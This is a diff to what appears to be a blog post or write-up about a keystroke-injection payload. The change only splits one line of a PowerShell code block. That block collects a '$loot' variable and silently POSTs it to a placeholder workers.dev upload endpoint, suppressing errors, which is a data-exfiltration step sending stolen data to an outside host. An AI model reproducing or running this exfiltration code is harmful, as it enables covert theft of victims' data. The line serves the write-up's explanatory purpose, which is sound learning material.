@@ -79,7 +79,8 @@ There is also something that should've been obvious, but somehow I didn't learn 
 
 ```
 STRING $body = $global:loot -join [Environment]::NewLine; \
-    try { Invoke-RestMethod -Method Post -Uri 'https://WORKER_URL_THING.workers.dev/api/upload' \
+    try { Invoke-RestMethod -Method Post \
+    -Uri 'https://WORKER_URL_THING.workers.dev/api/upload' \
     -Body $body -ContentType 'text/plain' } \
     catch {}; exit
 ```
